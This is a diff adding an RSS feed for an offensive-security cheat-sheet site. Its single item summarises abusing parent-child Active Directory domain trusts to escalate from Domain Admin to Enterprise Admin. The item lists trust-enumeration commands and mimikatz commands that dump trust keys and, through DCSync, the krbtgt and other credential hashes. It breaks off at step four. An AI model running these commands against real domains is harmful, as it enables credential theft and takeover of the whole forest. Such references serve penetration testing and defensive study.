@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Domain Trust on TLDRBins</title>
+    <link>https://tldrbins.github.io/@domain-trust/</link>
+    <description>Recent content in Domain Trust on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@domain-trust/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Abuse Parent Child Domain Trusts</title>
+      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
+      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID .\mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain .\mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
+    </item>
+  </channel>
+</rss>
